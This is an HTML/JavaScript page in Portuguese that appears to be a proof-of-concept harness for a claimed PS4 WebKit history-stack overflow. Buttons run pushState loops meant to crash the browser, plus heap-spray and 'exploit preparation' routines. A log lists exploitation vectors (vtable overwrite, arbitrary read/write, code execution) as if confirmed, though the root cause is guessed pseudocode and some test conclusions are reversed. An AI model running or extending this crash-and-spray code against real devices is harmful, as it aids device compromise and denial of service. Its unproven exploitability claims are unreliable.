<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit History Stack Overflow</title>
<style>
body { 
    font-family: 'Courier New', monospace; 
    background: #0a0a0a; 
    color: #00ff00; 
    padding: 20px;
}
.container {
    max-width: 1400px;
    margin: 0 auto;
}
h2 { color: #ff0000; border-bottom: 3px solid #ff0000; padding-bottom: 10px; }
h3 { color: #00ddff; margin-top: 25px; }
button { 
    font-size: 16px; 
    padding: 12px 20px; 
    margin: 8px; 
    background: #003300;
    color: #00ff00;
    border: 2px solid #00ff00;
    cursor: pointer;
    font-family: monospace;
    transition: all 0.3s;
}
button:hover { background: #004400; transform: scale(1.05); }
button.danger { background: #330000; border-color: #ff0000; color: #ff6666; }
button.danger:hover { background: #550000; }
button.safe { background: #003366; border-color: #0099ff; color: #66ccff; }
#log { 
    white-space: pre-wrap; 
    margin-top: 15px; 
    background: #001100;
    padding: 15px;
    border: 1px solid #00ff00;
    max-height: 600px;
    overflow-y: auto;
    font-size: 13px;
}
.info { color: #00ffff; }
.warning { color: #ffaa00; }
.error { color: #ff3333; }
.success { color: #00ff88; }
.critical { color: #ff0000; font-weight: bold; }
.vuln-box {
    background: #1a0000;
    border: 3px solid #ff0000;
    padding: 20px;
    margin: 20px 0;
}
.vuln-box h3 { color: #ff6666; margin-top: 0; }
.stats {
    background: #001a1a;
    padding: 15px;
    margin: 10px 0;
    border-left: 4px solid #00ffff;
}
.theory {
    background: #0a0a1a;
    border-left: 4px solid #ff00ff;
    padding: 15px;
    margin: 15px 0;
}
code {
    background: #002200;
    padding: 2px 6px;
    color: #ffff00;
    border-radius: 3px;
}
</style>
</head>

<body>
<div class="container">
<h2>üö® PS4 WebKit v12.00 ‚Äì History Stack Overflow Vulnerability</h2>

<div class="vuln-box">
<h3>‚ö†Ô∏è VULNERABILIDADE IDENTIFICADA</h3>
<strong>Tipo:</strong> History Stack Buffer Overflow / Array Out-of-Bounds<br>
<strong>Componente:</strong> WebKit History API (Session History)<br>
<strong>Limite Cr√≠tico:</strong> ~40-41 entradas no hist√≥rico<br>
<strong>Severidade:</strong> <span class="critical">CR√çTICA (Potencial RCE)</span><br><br>

<strong>Evid√™ncias:</strong><br>
‚úì Crash em ~41 itera√ß√µes independente de race condition<br>
‚úì Crash ocorre logo no in√≠cio do ciclo 41 (ITER 9)<br>
‚úì Aloca√ß√£o pura de mem√≥ria N√ÉO causa crash (descarta heap exhaustion)<br>
‚úì Problema espec√≠fico da History API<br>
</div>

<div class="theory">
<h3>üî¨ Teoria da Causa Raiz</h3>
<p><strong>Hip√≥tese Principal:</strong> WebKit do PS4 usa um <code>HistoryItem* items[40]</code> ou estrutura similar com verifica√ß√£o de bounds incorreta.</p>

<p><strong>Comportamento observado:</strong></p>
<code>
// Pseudoc√≥digo interno prov√°vel do WebKit PS4:<br>
class BackForwardList {<br>
&nbsp;&nbsp;HistoryItem* m_items[MAX_HISTORY]; // MAX_HISTORY ‚âà 40<br>
&nbsp;&nbsp;int m_currentIndex;<br>
&nbsp;&nbsp;<br>
&nbsp;&nbsp;void pushState(url) {<br>
&nbsp;&nbsp;&nbsp;&nbsp;m_currentIndex++;<br>
&nbsp;&nbsp;&nbsp;&nbsp;m_items[m_currentIndex] = new HistoryItem(url); // ‚ùå Sem valida√ß√£o!<br>
&nbsp;&nbsp;&nbsp;&nbsp;// Se m_currentIndex >= 40: BUFFER OVERFLOW<br>
&nbsp;&nbsp;}<br>
}
</code>

<p><strong>Por que crash no ITER 9 do ciclo 41?</strong><br>
Quando atinge 40+ entradas, o √≠ndice corrompido causa acesso inv√°lido na <strong>pr√≥xima opera√ß√£o de leitura/navega√ß√£o</strong>.</p>
</div>

<div class="stats">
<strong>Configura√ß√£o de Teste:</strong><br>
BASE: <span id="baseVal">977</span> bytes | 
STEP: <span id="stepVal">14461</span> bytes | 
LIMITE SEGURO: <span style="color:#00ff00">‚â§40 itera√ß√µes</span> | 
ZONA DE CRASH: <span style="color:#ff0000">‚â•41 itera√ß√µes</span>
</div>

<h3>üß™ Testes de Valida√ß√£o</h3>

<div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
<div>
<h4 style="color:#00ff88">‚úÖ Testes Seguros (‚â§40)</h4>
<button onclick="testSafe35()" class="safe">35 Itera√ß√µes (SEGURO)</button><br>
<button onclick="testSafe38()" class="safe">38 Itera√ß√µes (SEGURO)</button><br>
<button onclick="testSafe40()" class="safe">40 Itera√ß√µes (LIMITE)</button><br>
</div>

<div>
<h4 style="color:#ff3333">üí• Testes de Crash (‚â•41)</h4>
<button onclick="testCrash41()" class="danger">41 Itera√ß√µes (CRASH)</button><br>
<button onclick="testCrash45()" class="danger">45 Itera√ß√µes (CRASH)</button><br>
<button onclick="testCrash50()" class="danger">50 Itera√ß√µes (CRASH)</button><br>
</div>
</div>

<h3>üîç Testes Avan√ßados</h3>
<button onclick="testPreciseBoundary()">Teste: Encontrar Limite Exato (40-42)</button>
<button onclick="testWithoutReplace()">Teste: Apenas pushState (sem replaceState)</button>
<button onclick="testSmallPayloads()">Teste: Payloads Pequenos (10 bytes)</button>
<button onclick="testExploitPrep()">üéØ Preparar Heap para Explora√ß√£o</button>

<h3>üìä An√°lise de Exploitabilidade</h3>
<button onclick="analyzeExploit()">Analisar Vetores de Explora√ß√£o</button>
<button onclick="heapSpray()">Heap Spray Controlado</button>

<h3>‚öôÔ∏è Controles</h3>
<button onclick="clearLog()">Limpar Log</button>
<button onclick="resetHistory()">Reset Hist√≥rico (Limpar Estado)</button>

<div id="log"></div>
</div>

<script>
const logEl = document.getElementById("log");
let testCounter = 0;

function log(m, type = 'normal'){
    const colors = {
        normal: '',
        info: 'info',
        warning: 'warning',
        error: 'error',
        success: 'success',
        critical: 'critical'
    };
    const timestamp = new Date().toLocaleTimeString();
    const line = `[${timestamp}] ${m}`;
    logEl.innerHTML += `<span class="${colors[type]}">${line}</span>\n`;
    logEl.scrollTop = logEl.scrollHeight;
}

function clearLog(){ logEl.innerHTML = ""; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;

document.getElementById('baseVal').textContent = BASE;
document.getElementById('stepVal').textContent = STEP;

// -------------------------------------------------
// CORE: Sequ√™ncia de History
// -------------------------------------------------
async function historyLoop(iterations, useReplace = true, payloadSize = null){
    let size = payloadSize || BASE;
    
    for(let i=0; i<iterations; i++){
        const payload = "H".repeat(size);
        log(`[ITER ${i}] size=${size.toLocaleString()}`, i >= 40 ? 'error' : 'info');
        
        try {
            history.pushState({}, "", "#"+payload);
            
            if(useReplace){
                history.replaceState({}, "", "#"+payload.slice(0, payload.length >> 1));
            }
            
            if(!payloadSize) size += STEP;
            await sleep(5);
            
        } catch(e){
            log(`[üí•] CRASH no ITER ${i}: ${e}`, 'critical');
            throw e;
        }
    }
}

// -------------------------------------------------
// TESTES SEGUROS
// -------------------------------------------------
async function testSafe35(){
    clearLog();
    log("=== TESTE SEGURO: 35 itera√ß√µes ===", 'success');
    try {
        await historyLoop(35);
        log("[‚úì] 35 itera√ß√µes completadas SEM CRASH", 'success');
    } catch(e){
        log("[‚úó] Crash inesperado: " + e, 'error');
    }
}

async function testSafe38(){
    clearLog();
    log("=== TESTE SEGURO: 38 itera√ß√µes ===", 'success');
    try {
        await historyLoop(38);
        log("[‚úì] 38 itera√ß√µes completadas SEM CRASH", 'success');
    } catch(e){
        log("[‚úó] Crash inesperado: " + e, 'error');
    }
}

async function testSafe40(){
    clearLog();
    log("=== TESTE NO LIMITE: 40 itera√ß√µes ===", 'warning');
    try {
        await historyLoop(40);
        log("[‚úì] 40 itera√ß√µes completadas (LIMITE M√ÅXIMO SEGURO)", 'success');
    } catch(e){
        log("[‚úó] Crash no limite: " + e, 'error');
    }
}

// -------------------------------------------------
// TESTES DE CRASH
// -------------------------------------------------
async function testCrash41(){
    clearLog();
    log("=== TESTE DE CRASH: 41 itera√ß√µes ===", 'error');
    log("‚ö†Ô∏è Esperado: Crash entre ITER 5-15", 'warning');
    try {
        await historyLoop(41);
        log("[?] 41 itera√ß√µes SEM CRASH (inesperado!)", 'warning');
    } catch(e){
        log("[üí•] CRASH CONFIRMADO: " + e, 'critical');
    }
}

async function testCrash45(){
    clearLog();
    log("=== TESTE DE CRASH: 45 itera√ß√µes ===", 'error');
    try {
        await historyLoop(45);
        log("[?] 45 itera√ß√µes SEM CRASH", 'warning');
    } catch(e){
        log("[üí•] CRASH CONFIRMADO: " + e, 'critical');
    }
}

async function testCrash50(){
    clearLog();
    log("=== TESTE DE CRASH: 50 itera√ß√µes ===", 'error');
    try {
        await historyLoop(50);
        log("[?] 50 itera√ß√µes SEM CRASH", 'warning');
    } catch(e){
        log("[üí•] CRASH CONFIRMADO: " + e, 'critical');
    }
}

// -------------------------------------------------
// TESTES AVAN√áADOS
// -------------------------------------------------
async function testPreciseBoundary(){
    clearLog();
    log("=== BUSCA BIN√ÅRIA: Limite Exato ===", 'info');
    
    for(let i=39; i<=43; i++){
        log(`\n[‚Üí] Testando ${i} itera√ß√µes...`, 'warning');
        try {
            await historyLoop(i);
            log(`[‚úì] ${i}: SEM CRASH`, 'success');
            await sleep(100);
        } catch(e){
            log(`[üí•] ${i}: CRASH DETECTADO!`, 'critical');
            log(`>>> LIMITE EXATO: Entre ${i-1} e ${i} itera√ß√µes <<<`, 'critical');
            return;
        }
    }
}

async function testWithoutReplace(){
    clearLog();
    log("=== TESTE: Apenas pushState (sem replaceState) ===", 'info');
    log("Objetivo: Verificar se replaceState influencia\n", 'warning');
    
    try {
        await historyLoop(45, false); // useReplace = false
        log("[‚úì] 45 pushState sem replaceState: SEM CRASH", 'success');
        log(">>> replaceState N√ÉO √© necess√°rio para o crash <<<", 'warning');
    } catch(e){
        log("[üí•] Crash mesmo sem replaceState: " + e, 'critical');
        log(">>> Confirma: problema √© o COUNT de entradas, n√£o opera√ß√£o <<<", 'critical');
    }
}

async function testSmallPayloads(){
    clearLog();
    log("=== TESTE: Payloads Pequenos (10 bytes) ===", 'info');
    log("Objetivo: Verificar se tamanho do payload importa\n", 'warning');
    
    try {
        await historyLoop(45, true, 10); // payloadSize = 10
        log("[‚úì] 45 itera√ß√µes com 10 bytes: SEM CRASH", 'success');
        log(">>> Tamanho do payload √© irrelevante <<<", 'warning');
    } catch(e){
        log("[üí•] Crash com payloads pequenos: " + e, 'critical');
        log(">>> Confirma: problema √© CONTAGEM, n√£o tamanho <<<", 'critical');
    }
}

// -------------------------------------------------
// PREPARA√á√ÉO PARA EXPLORA√á√ÉO
// -------------------------------------------------
async function testExploitPrep(){
    clearLog();
    log("=== PREPARA√á√ÉO DE HEAP PARA EXPLORA√á√ÉO ===", 'critical');
    log("Estrat√©gia: Preencher heap com dados controlados antes do overflow\n", 'warning');
    
    try {
        log("[1] Heap spray inicial", 'info');
        let spray = [];
        for(let i=0; i<100; i++){
            spray.push("EXPLOIT_MARKER_" + i.toString(16).padStart(8, '0') + "_" + "X".repeat(1000));
        }
        log(`[‚úì] ${spray.length} objetos spray criados`, 'success');
        
        await sleep(50);
        
        log("\n[2] Preencher hist√≥rico at√© limite", 'info');
        await historyLoop(39); // Parar em 39 (seguro)
        log("[‚úì] 39 entradas de hist√≥rico criadas", 'success');
        
        await sleep(50);
        
        log("\n[3] ESTADO PRONTO PARA EXPLORA√á√ÉO", 'critical');
        log("Heap cont√©m objetos spray + 39 entradas de hist√≥rico", 'warning');
        log("Pr√≥ximo pushState (#40) pode sobrescrever regi√£o controlada!", 'critical');
        log("\n>>> Prepara√ß√£o completa. N√ÉO executar pushState adicional! <<<", 'error');
        
    } catch(e){
        log("[‚úó] Erro na prepara√ß√£o: " + e, 'error');
    }
}

async function analyzeExploit(){
    clearLog();
    log("=== AN√ÅLISE DE VETORES DE EXPLORA√á√ÉO ===", 'critical');
    
    log("\nüìå VETOR 1: Corrup√ß√£o de Ponteiro", 'warning');
    log("   ‚Ä¢ pushState #41+ escreve fora do array m_items[]", 'info');
    log("   ‚Ä¢ Sobrescreve metadata adjacente (vtable, length, etc)", 'info');
    log("   ‚Ä¢ Pr√≥xima opera√ß√£o de hist√≥rico usa ponteiro corrompido", 'info');
    log("   ‚Ä¢ Controle de RIP/PC via vtable forjada", 'info');
    
    log("\nüìå VETOR 2: Informa√ß√£o Leak", 'warning');
    log("   ‚Ä¢ Criar 40 entradas com URLs controladas", 'info');
    log("   ‚Ä¢ pushState #41 pode retornar dados de mem√≥ria adjacente", 'info');
    log("   ‚Ä¢ Usar getters de History API para ler corrup√ß√£o", 'info');
    
    log("\nüìå VETOR 3: Heap Feng Shui", 'warning');
    log("   ‚Ä¢ Preencher heap com objetos JavaScript controlados", 'info');
    log("   ‚Ä¢ Posicionar array vuln adjacent a objeto alvo", 'info');
    log("   ‚Ä¢ Overflow modifica propriedades do objeto alvo", 'info');
    log("   ‚Ä¢ Exemplo: modificar Array.length para OOB read/write", 'info');
    
    log("\nüéØ PRIMITIVAS NECESS√ÅRIAS:", 'critical');
    log("   ‚úì Arbitrary Read: Corromper ponteiro + history.state", 'success');
    log("   ‚úì Arbitrary Write: Heap spray + pushState overflow", 'success');
    log("   ‚úì Code Execution: Sobrescrever vtable ou JIT code", 'success');
    
    log("\n‚ö†Ô∏è MITIGA√á√ïES POSS√çVEIS (a verificar):", 'warning');
    log("   ? ASLR ativo?", 'info');
    log("   ? DEP/NX ativo?", 'info');
    log("   ? Stack canaries?", 'info');
    log("   ? JIT hardening?", 'info');
}

async function heapSpray(){
    clearLog();
    log("=== HEAP SPRAY CONTROLADO ===", 'warning');
    
    try {
        log("[‚Üí] Criando objetos com padr√£o detect√°vel", 'info');
        
        const SPRAY_COUNT = 200;
        const MARKER = 0x41424344; // "ABCD"
        let objects = [];
        
        for(let i=0; i<SPRAY_COUNT; i++){
            objects.push({
                marker: MARKER,
                index: i,
                padding: "SPRAY".repeat(200)
            });
        }
        
        log(`[‚úì] ${SPRAY_COUNT} objetos spray criados`, 'success');
        log(`    Marcador: 0x${MARKER.toString(16).toUpperCase()}`, 'info');
        
        await sleep(100);
        
        log("\n[‚Üí] Tentando overflow com objetos spray no heap...", 'warning');
        await historyLoop(42); // Trigger overflow
        
    } catch(e){
        log(`[üí•] CRASH durante heap spray: ${e}`, 'critical');
        log(">>> Se crash, inspecionar dump para verificar se objetos spray est√£o adjacentes <<<", 'warning');
    }
}

function resetHistory(){
    clearLog();
    log("‚ö†Ô∏è N√£o √© poss√≠vel limpar hist√≥rico via JavaScript", 'warning');
    log("Recarregue a p√°gina (F5) para reset completo", 'info');
}

log("üî• Ferramenta de an√°lise carregada. CUIDADO: testes de crash podem travar o navegador!", 'critical');
log("\nüí° DESCOBERTA: Limite de ~40 entradas na History Stack", 'warning');
log("   Crash ocorre no in√≠cio do ciclo 41, n√£o no final!", 'info');
</script>
</body>
</html>
